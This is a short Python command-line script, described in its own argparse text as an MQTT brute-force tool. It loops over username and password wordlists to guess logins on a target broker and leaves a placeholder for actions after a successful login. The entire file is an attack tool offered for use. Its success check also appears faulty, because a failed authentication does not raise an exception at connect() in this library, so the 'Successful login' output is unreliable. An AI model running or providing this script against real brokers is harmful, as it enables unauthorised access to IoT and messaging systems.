import argparse
import paho.mqtt.client as mqtt

def brute_force_mqtt(ip, port, username_file, password_file):
    with open(username_file, 'r') as user_file:
        usernames = user_file.read().splitlines()
    with open(password_file, 'r') as pass_file:
        passwords = pass_file.read().splitlines()

    for username in usernames:
        for password in passwords:
            client = mqtt.Client()
            client.username_pw_set(username, password)
            try:
                client.connect(ip, port)
                print(f"Successful login: {username}:{password}")
                # Do something here after successful login
                client.disconnect()
            except:
                print(f"Failed login: {username}:{password}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MQTT Brute-Force Script")
    parser.add_argument("-i", "--ip", required=True, help="MQTT server IP")
    parser.add_argument("-p", "--port", type=int, required=True, help="MQTT server port")
    parser.add_argument("-u", "--userfile", required=True, help="Username list file path")
    parser.add_argument("-pw", "--passfile", required=True, help="Password list file path")
    args = parser.parse_args()

    brute_force_mqtt(args.ip, args.port, args.userfile, args.passfile)
